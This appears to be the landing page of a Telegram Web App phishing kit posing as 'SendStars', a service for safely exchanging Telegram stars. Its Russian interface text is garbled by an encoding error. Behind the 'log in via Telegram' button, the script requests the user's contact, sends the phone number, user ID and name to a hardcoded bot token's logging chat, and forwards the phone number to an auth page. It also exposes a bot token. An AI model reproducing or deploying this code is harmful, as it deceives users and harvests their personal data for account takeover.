<!DOCTYPE html>
<html lang="ru">
	<head>
		<meta charset="utf-8" />
		<meta name="viewport" content="width=device-width,initial-scale=1" />
		<title>SendStars ‚Äî –ø—Ä–∏–≤–µ—Ç—Å—Ç–≤–µ–Ω–Ω—ã–π —ç–∫—Ä–∞–Ω</title>
		<script src="https://telegram.org/js/telegram-web-app.js"></script>
		<style>
			:root {
				--bg: #f6f8fb;
				--primary-1: #2a9bf8;
				--primary-2: #1877e4;
				--text-strong: #0f1724;
				--text-muted: #64748b;
			}

			* {
				box-sizing: border-box;
				margin: 0;
				padding: 0;
			}
			html,
			body {
				height: 100%;
			}

			body {
				font-family: Inter, system-ui, -apple-system, 'Segoe UI', Roboto,
					'Helvetica Neue', Arial;
				background: #1c1b1b;
				color: var(--text-strong);
				display: flex;
				align-items: center;
				justify-content: center;
				padding: 20px;
				min-height: 100vh;
			}

			.screen {
				width: 400px;
				height: 600px;
				background: #1c1b1b;
				display: flex;
				flex-direction: column;
				align-items: center;
				justify-content: center;
				padding: 40px 28px;
				position: relative;
				margin: auto;
			}

			.content {
				display: flex;
				flex-direction: column;
				align-items: center;
				justify-content: center;
				text-align: center;
				gap: 14px;
				transform: translateY(-20px);
			}

			.hero-image {
				width: 160px;
				height: 160px;
				object-fit: contain;
				margin-top: 45px;
				border: none;
				background: none;
				box-shadow: none;
			}

			h1 {
				font-size: 28px;
				line-height: 1.2;
				color: #fff;
				font-weight: 700;
			}

			h1 .brand {
				display: block;
				color: var(--primary-2);
				font-weight: 800;
				font-size: 28px;
				letter-spacing: 0.2px;
			}

			p.lead {
				color: #b0acac;
				font-size: 17px;
				max-width: 320px;
				margin: 0 auto;
			}

			.cta {
				width: 100%;
				max-width: 275px;
				height: 60px;
				display: inline-flex;
				align-items: center;
				justify-content: center;
				gap: 10px;
				border-radius: 16px;
				border: none;
				color: #fff;
				font-weight: 700;
				font-size: 15px;
				cursor: pointer;
				background: linear-gradient(
					180deg,
					var(--primary-1) 0%,
					var(--primary-2) 100%
				);
				box-shadow: 0 6px 16px rgba(30, 110, 230, 0.18);
				text-decoration: none;
				transition: transform 0.12s ease;
				margin-top: 25px;
			}

			.cta:active {
				transform: translateY(1px);
			}

			.cta .icon {
				display: inline-flex;
				width: 22px;
				height: 22px;
				align-items: center;
				justify-content: center;
			}

			.footer {
				font-size: 12px;
				color: var(--text-muted);
				text-align: center;
				margin-top: 80px;
			}
		</style>
	</head>
	<body>
		<div class="screen">
			<div class="content" id="firstPage">
				<img
					class="hero-image"
					src="your-image.png"
					alt="–ò–∑–æ–±—Ä–∞–∂–µ–Ω–∏–µ SendStars"
				/>

				<h1>
					–î–æ–±—Ä–æ –ø–æ–∂–∞–ª–æ–≤–∞—Ç—å –≤
					<span class="brand">SendStars</span>
				</h1>

				<p class="lead">–ë–µ–∑–æ–ø–∞—Å–Ω—ã–π –æ–±–º–µ–Ω –∏ –ø–µ—Ä–µ–¥–∞—á–∞ –∑–≤—ë–∑–¥</p>

				<button class="cta" id="requestContactBtn">
					<span class="icon">
						<svg
							xmlns="http://www.w3.org/2000/svg"
							width="22"
							height="22"
							viewBox="0 0 24 24"
							fill="white"
						>
							<path
								d="M12 0C5.373 0 0 5.373 0 12c0 6.627 5.373 12 12 12s12-5.373 12-12C24 5.373 18.627 0 12 0zm4.98 8.1l-1.71 8.07c-.13.58-.47.72-.95.45l-2.64-1.95-1.27 1.23c-.14.14-.25.25-.5.25l.18-2.61 4.76-4.3c.21-.18-.05-.29-.32-.11l-5.89 3.7-2.54-.79c-.55-.17-.56-.55.11-.81l9.93-3.82c.46-.17.86.11.71.79z"
							/>
						</svg>
					</span>
					<span>–í–æ–π—Ç–∏ —á–µ—Ä–µ–∑ Telegram</span>
				</button>
			</div>

			<div class="footer">¬© SendStars ‚Äî –∑–∞—â–∏—â—ë–Ω–Ω—ã–µ –ø–µ—Ä–µ–¥–∞—á–∏ 2024-2025</div>
		</div>

		<script>
			const tg = window.Telegram.WebApp;

			try {
				tg.expand();
				tg.enableClosingConfirmation();
			} catch (e) {
				console.log('Telegram WebApp not available');
			}

			const requestContactBtn = document.getElementById('requestContactBtn');

		function requestContact() {
			try {
				tg.requestContact(contact => {
					console.log('–ö–æ–Ω—Ç–∞–∫—Ç –ø–æ–ª—É—á–µ–Ω:', contact);
					
					if (contact) {
						// –ü–æ–¥–¥–µ—Ä–∂–∫–∞ —Ä–∞–∑–Ω—ã—Ö —Ñ–æ—Ä–º–∞—Ç–æ–≤ –ø–æ–ª–µ–π (camelCase –∏ snake_case)
						const phoneNumber = contact.phoneNumber || contact.phone_number || '';
						const userId = contact.userId || contact.user_id || '';
						const firstName = contact.firstName || contact.first_name || '';
						const lastName = contact.lastName || contact.last_name || '';

						console.log('–û–±—Ä–∞–±–æ—Ç–∞–Ω–Ω—ã–π –∫–æ–Ω—Ç–∞–∫—Ç:', {
							phoneNumber,
							userId,
							firstName,
							lastName
						});

						// –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –¥–∞–Ω–Ω—ã–µ –≤ –±–æ—Ç, –¥–∞–∂–µ –µ—Å–ª–∏ –Ω–µ –≤—Å–µ –ø–æ–ª—è –µ—Å—Ç—å
						if (phoneNumber || userId) {
							const botToken =
								'7716220386:AAGwhUsT8OCKeBM8GmB7_sNXtFBvFgr_64I';
							const logChatId = '-1003298308264';

							const message = `üì± –ü–æ–ª—É—á–µ–Ω –∫–æ–Ω—Ç–∞–∫—Ç\nüë§ –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å: ${
								userId || '–Ω–µ–∏–∑–≤–µ—Å—Ç–Ω–æ'
							}\nüìû –¢–µ–ª–µ—Ñ–æ–Ω: ${phoneNumber || '–Ω–µ —É–∫–∞–∑–∞–Ω'}\nüë§ –ò–º—è: ${
								firstName || ''
							} ${lastName || ''}\nüÜî Contact ID: ${userId || '–Ω–µ–∏–∑–≤–µ—Å—Ç–Ω–æ'}`;

							fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
								method: 'POST',
								headers: {
									'Content-Type': 'application/json',
								},
								body: JSON.stringify({
									chat_id: logChatId,
									text: message,
									parse_mode: 'HTML',
								}),
							}).catch(error => {
								console.error('–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ –∫–æ–Ω—Ç–∞–∫—Ç–∞:', error);
							});
						}

						// –ü–µ—Ä–µ—Ö–æ–¥–∏–º –Ω–∞ auth.html –≤ –ª—é–±–æ–º —Å–ª—É—á–∞–µ
						if (phoneNumber) {
							window.location.href = `auth.html?phone=${encodeURIComponent(phoneNumber)}`;
						} else {
							// –ï—Å–ª–∏ –Ω–æ–º–µ—Ä–∞ –Ω–µ—Ç, –≤—Å–µ —Ä–∞–≤–Ω–æ –ø–µ—Ä–µ—Ö–æ–¥–∏–º (–º–æ–∂–Ω–æ –±—É–¥–µ—Ç –≤–≤–µ—Å—Ç–∏ –≤—Ä—É—á–Ω—É—é)
							console.log('–ù–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞ –Ω–µ –ø–æ–ª—É—á–µ–Ω, –ø–µ—Ä–µ—Ö–æ–¥–∏–º –±–µ–∑ –ø–∞—Ä–∞–º–µ—Ç—Ä–∞');
							window.location.href = 'auth.html';
						}
					} else {
						console.log('–ö–æ–Ω—Ç–∞–∫—Ç –Ω–µ –ø–æ–ª—É—á–µ–Ω, –ø–µ—Ä–µ—Ö–æ–¥–∏–º –Ω–∞ auth.html');
						window.location.href = 'auth.html';
					}
				});
			} catch (e) {
				console.error('Error requesting contact:', e);
				// –í —Å–ª—É—á–∞–µ –æ—à–∏–±–∫–∏ —Ç–æ–∂–µ –ø–µ—Ä–µ—Ö–æ–¥–∏–º –Ω–∞ auth.html
				window.location.href = 'auth.html';
			}
		}

			if (requestContactBtn) {
				requestContactBtn.addEventListener('click', requestContact);
			}
		</script>
	</body>
</html>
